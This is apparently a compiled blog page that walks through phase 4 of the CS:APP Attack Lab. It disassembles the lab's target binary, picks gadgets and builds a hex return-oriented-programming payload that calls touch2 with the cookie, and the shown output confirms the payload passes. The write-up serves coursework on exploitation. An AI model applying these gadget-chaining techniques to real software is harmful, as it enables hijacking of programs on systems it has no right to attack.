import{_ as e,o as a,c as t,e as n}from"./app-CoV9NwP4.js";const d={},i=n(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> rtarget <span class="token operator">&gt;</span> rtarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-rtarget-asm"><span>Read File <code>rtarget.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>...
0000000000401b6a &lt;touch2&gt;:
...
0000000000401d0f &lt;start_farm&gt;:
  401d0f:	b8 01 00 00 00       	mov    $0x1,%eax
  401d14:	c3                   	retq

0000000000401d15 &lt;addval_420&gt;:
  401d15:	8d 87 48 89 c7 94    	lea    -0x6b3876b8(%rdi),%eax
  401d1b:	c3                   	retq

0000000000401d1c &lt;setval_146&gt;:
  401d1c:	c7 07 58 92 90 90    	movl   $0x90909258,(%rdi)
  401d22:	c3                   	retq

0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq

0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq

0000000000401d31 &lt;setval_387&gt;:
  401d31:	c7 07 58 c3 08 57    	movl   $0x5708c358,(%rdi)
  401d37:	c3                   	retq

0000000000401d38 &lt;getval_439&gt;:
  401d38:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  401d3d:	c3                   	retq

0000000000401d3e &lt;getval_205&gt;:
  401d3e:	b8 b7 d7 58 c2       	mov    $0xc258d7b7,%eax
  401d43:	c3                   	retq

0000000000401d44 &lt;setval_398&gt;:
  401d44:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  401d4a:	c3                   	retq

0000000000401d4b &lt;mid_farm&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="design-gadget" tabindex="-1"><a class="header-anchor" href="#design-gadget"><span>Design Gadget</span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>58        popq %rax
c3        ret
48 89 c7  movq %rax, %rdi
c3        ret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="search-gadget-in-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#search-gadget-in-rtarget-asm"><span>Search Gadget in <code>rtarget.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq
0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt"><span>Read File <code>cookie.txt</code></span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="write-file-phase-4-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-4-txt"><span>Write File <code>phase-4.txt</code></span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
26 1d 40 00 00 00 00 00
2f 6c 9a 3a 00 00 00 00
2c 1d 40 00 00 00 00 00
6a 1b 40 00 00 00 00 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-4.txt <span class="token operator">&gt;</span> phase-4.in
./rtarget <span class="token parameter variable">-i</span> phase-4.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output"><span>Terminal Output</span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch2!: You called touch2(0x3a9a6c2f)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16),s=[i];function l(r,c){return a(),t("div",null,s)}const m=e(d,[["render",l],["__file","2022-04-23-phase-4.html.vue"]]),o=JSON.parse('{"path":"/2022/course-work/csapp/attack-lab/2022-04-23-phase-4.html","title":"Attack Lab: Phase 4","lang":"en-US","frontmatter":{"date":"2022-04-23T00:00:00.000Z","isOriginal":true,"category":["Course Work"],"tag":["Attack Lab","Computer Organization and Architecture"],"title":"Attack Lab: Phase 4","description":"Run Read File rtarget.asm Design Gadget Search Gadget in rtarget.asm Read File cookie.txt Write File phase-4.txt Run Terminal Output","head":[["meta",{"property":"og:url","content":"https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-4.html"}],["meta",{"property":"og:site_name","content":"Blog"}],["meta",{"property":"og:title","content":"Attack Lab: Phase 4"}],["meta",{"property":"og:description","content":"Run Read File rtarget.asm Design Gadget Search Gadget in rtarget.asm Read File cookie.txt Write File phase-4.txt Run Terminal Output"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"en-US"}],["meta",{"property":"og:updated_time","content":"2024-03-03T09:57:39.000Z"}],["meta",{"property":"article:author","content":"liblaf"}],["meta",{"property":"article:tag","content":"Attack Lab"}],["meta",{"property":"article:tag","content":"Computer Organization and Architecture"}],["meta",{"property":"article:published_time","content":"2022-04-23T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-03-03T09:57:39.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Attack Lab: Phase 4\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-04-23T00:00:00.000Z\\",\\"dateModified\\":\\"2024-03-03T09:57:39.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"liblaf\\",\\"url\\":\\"https://liblaf.me\\",\\"email\\":\\"i@liblaf.me\\"}]}"]]},"headers":[],"git":{"createdTime":1677217008000,"updatedTime":1709459859000,"contributors":[{"name":"liblaf","email":"30631553+liblaf@users.noreply.github.com","commits":3}]},"readingTime":{"minutes":1.13,"words":339},"filePathRelative":"2022/course-work/csapp/attack-lab/2022-04-23-phase-4.md","localizedDate":"April 23, 2022","excerpt":"<h6>Run</h6>\\n<div class=\\"language-bash\\" data-ext=\\"sh\\" data-title=\\"sh\\"><pre class=\\"language-bash\\"><code>objdump <span class=\\"token parameter variable\\">--disassemble</span> rtarget <span class=\\"token operator\\">&gt;</span> rtarget.asm\\n</code></pre></div><h6>Read File <code>rtarget.asm</code></h6>\\n<div class=\\"language-assembly\\" data-ext=\\"assembly\\" data-title=\\"assembly\\"><pre class=\\"language-assembly\\"><code>...\\n0000000000401b6a &lt;touch2&gt;:\\n...\\n0000000000401d0f &lt;start_farm&gt;:\\n  401d0f:\\tb8 01 00 00 00       \\tmov    $0x1,%eax\\n  401d14:\\tc3                   \\tretq\\n\\n0000000000401d15 &lt;addval_420&gt;:\\n  401d15:\\t8d 87 48 89 c7 94    \\tlea    -0x6b3876b8(%rdi),%eax\\n  401d1b:\\tc3                   \\tretq\\n\\n0000000000401d1c &lt;setval_146&gt;:\\n  401d1c:\\tc7 07 58 92 90 90    \\tmovl   $0x90909258,(%rdi)\\n  401d22:\\tc3                   \\tretq\\n\\n0000000000401d23 &lt;addval_451&gt;:\\n  401d23:\\t8d 87 00 58 c3 1c    \\tlea    0x1cc35800(%rdi),%eax\\n  401d29:\\tc3                   \\tretq\\n\\n0000000000401d2a &lt;addval_158&gt;:\\n  401d2a:\\t8d 87 48 89 c7 c3    \\tlea    -0x3c3876b8(%rdi),%eax\\n  401d30:\\tc3                   \\tretq\\n\\n0000000000401d31 &lt;setval_387&gt;:\\n  401d31:\\tc7 07 58 c3 08 57    \\tmovl   $0x5708c358,(%rdi)\\n  401d37:\\tc3                   \\tretq\\n\\n0000000000401d38 &lt;getval_439&gt;:\\n  401d38:\\tb8 48 89 c7 c3       \\tmov    $0xc3c78948,%eax\\n  401d3d:\\tc3                   \\tretq\\n\\n0000000000401d3e &lt;getval_205&gt;:\\n  401d3e:\\tb8 b7 d7 58 c2       \\tmov    $0xc258d7b7,%eax\\n  401d43:\\tc3                   \\tretq\\n\\n0000000000401d44 &lt;setval_398&gt;:\\n  401d44:\\tc7 07 48 89 c7 c7    \\tmovl   $0xc7c78948,(%rdi)\\n  401d4a:\\tc3                   \\tretq\\n\\n0000000000401d4b &lt;mid_farm&gt;:\\n...\\n</code></pre></div>","autoDesc":true}');export{m as comp,o as data};
